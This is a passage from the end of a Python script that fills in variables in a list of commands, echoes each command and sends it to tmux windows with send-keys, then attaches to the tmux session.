                    for cmd in cmds:
                        # Replace variables
                        cmd_exec = format_command(cmd, variables)
                        # Display the command
                        cmd_display = colored(cmd_exec, "cyan")
                        tmux_cmd = f"echo -e '$ {cmd_display}'"
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                        # Execute the command
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", cmd_exec, 'C-m'])
                # Keep the window open
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", 'bash', 'C-m'])
                window_index += 1

    cprint(f"[*] Commands sent to tmux session.", "green")
    cprint(f"[+] Attaching to tmux session: {session_name}", "blue")
    subprocess.call(['tmux', 'attach-session', '-t', session_name])

if __name__ == '__main__':
    main()
